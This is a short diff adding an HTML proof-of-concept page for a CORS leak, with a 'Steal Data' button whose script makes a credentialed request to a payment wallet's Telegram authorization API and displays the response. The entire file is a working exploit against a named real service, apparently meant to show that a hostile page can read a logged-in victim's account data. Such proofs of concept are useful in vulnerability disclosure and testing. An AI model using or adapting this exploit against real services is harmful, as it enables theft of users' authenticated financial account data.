@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CORS PoC</title>
+</head>
+<body>
+  <h1>PoC: CORS Leak</h1>
+  <button onclick="exploit()">Steal Data</button>
+  <pre id="output"></pre>
+
+  <script>
+  async function exploit() {
+    const res = await fetch("https://pay.wallet.tg/api/v1/users/authorize_by_telegram/", {
+      method: "GET",
+      credentials: "include"
+    });
+    const text = await res.text();
+    document.getElementById("output").textContent = text;
+  }
+  </script>
+</body>
+</html>
